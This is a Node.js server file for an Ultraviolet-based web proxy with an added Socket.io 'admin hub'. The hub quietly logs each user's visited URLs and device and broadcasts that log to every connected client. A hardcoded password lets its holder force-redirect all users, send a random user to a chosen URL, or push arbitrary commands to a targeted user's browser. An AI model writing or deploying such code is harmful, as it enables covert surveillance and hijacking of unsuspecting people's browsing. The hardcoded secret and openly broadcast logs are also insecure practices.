import { join } from "node:path";
import { hostname } from "node:os";
import { createServer } from "node:http";
import express from "express";
import wisp from "wisp-server-node";
import { Server } from "socket.io";

import { uvPath } from "@titaniumnetwork-dev/ultraviolet";
import { epoxyPath } from "@mercuryworkshop/epoxy-transport";
import { baremuxPath } from "@mercuryworkshop/bare-mux/node";

const app = express();

app.use(express.static("./public"));
app.use("/uv/", express.static(uvPath));
app.use("/epoxy/", express.static(epoxyPath));
app.use("/baremux/", express.static(baremuxPath));

app.use((req, res) => {
	res.status(404);
	res.sendFile("./public/404.html");
});

const server = createServer();
const io = new Server(server);

// ==========================================
// SOCKET.IO LIVE ADMIN HUB & ROSTER
// ==========================================
const clientRoster = {}; // Memory bank for the Targeted Strike Roster

io.on('connection', (socket) => {
	// Initialize new device in the roster
	clientRoster[socket.id] = { id: socket.id, url: 'Idle / Homepage', device: 'Unknown' };

	io.emit('user_count', io.engine.clientsCount);

	socket.on('disconnect', () => {
		delete clientRoster[socket.id];
		io.emit('user_count', io.engine.clientsCount);
	});

	socket.on('request_ping', () => {
		socket.emit('user_count', io.engine.clientsCount);
	});

	// ACTIVE HEARTBEAT: Captures SPAs and iOS sleep-wake cycles flawlessly
	socket.on('user_activity', (data) => {
		if (clientRoster[socket.id]) {
			// Only update the sniffer log if the URL actually changed
			if (clientRoster[socket.id].url !== data.url && data.url !== 'Idle / Homepage') {
				io.emit('admin_traffic_log', {
					id: socket.id.substring(0, 5),
						url: data.url,
						time: new Date().toLocaleTimeString()
				});
			}
			clientRoster[socket.id].url = data.url;
			clientRoster[socket.id].device = data.device;
		}
	});

	// GLOBAL COMMANDS
	socket.on('admin_command', async (payload) => {
		const { password, action, data } = payload;
		if (password === '248169') {
			if (action === 'force_url') {
				const sockets = await io.fetchSockets();
				sockets.forEach((clientSocket, index) => {
					setTimeout(() => clientSocket.emit('execute_command', { action, data }), index * 800);
				});
			} else if (action === 'roulette') {
				const sockets = await io.fetchSockets();
				if (sockets.length > 0) {
					const randomIndex = Math.floor(Math.random() * sockets.length);
					const targetSocket = sockets[randomIndex];
					targetSocket.emit('execute_command', { action: 'force_url', data: data });
					io.emit('admin_receive_reply', `[CHAOS ROULETTE] Target #${targetSocket.id.substring(0,5)} sent to ${data}`);
				}
			} else {
				io.emit('execute_command', { action, data });
			}
		}
	});

	// TARGETED STRIKE COMMANDS
	socket.on('targeted_command', (payload) => {
		const { password, targetId, action, data } = payload;
		if (password === '248169') {
			io.to(targetId).emit('execute_command', { action, data });
			io.emit('admin_receive_reply', `[TARGETED STRIKE] Executed '${action}' on User #${targetId.substring(0,5)}`);
		}
	});

	socket.on('user_reply', (replyText) => {
		io.emit('admin_receive_reply', replyText);
	});
});

// SERVER HEARTBEAT: Blasts the live roster map to the Admin Panel every 1 second
setInterval(() => {
	io.emit('roster_update', Object.values(clientRoster));
}, 1000);

// ==========================================
// SERVER TRAFFIC ROUTING
// ==========================================
server.on("request", (req, res) => {
	if (req.url.startsWith("/socket.io/")) return;
	res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
	res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
	app(req, res);
});

server.on("upgrade", (req, socket, head) => {
	if (req.url.endsWith("/wisp/")) {
		wisp.routeRequest(req, socket, head);
		return;
	}
	if (req.url.startsWith("/socket.io/")) return;
	socket.end();
});

let port = parseInt(process.env.PORT || "");
if (isNaN(port)) port = 8080;

server.on("listening", () => {
	const address = server.address();
	console.log("Listening on port:", address.port);
	console.log(`\tAdmin Socket.io Hub Active.`);
});

process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

function shutdown() {
	server.close();
	process.exit(0);
}

server.listen({ port });
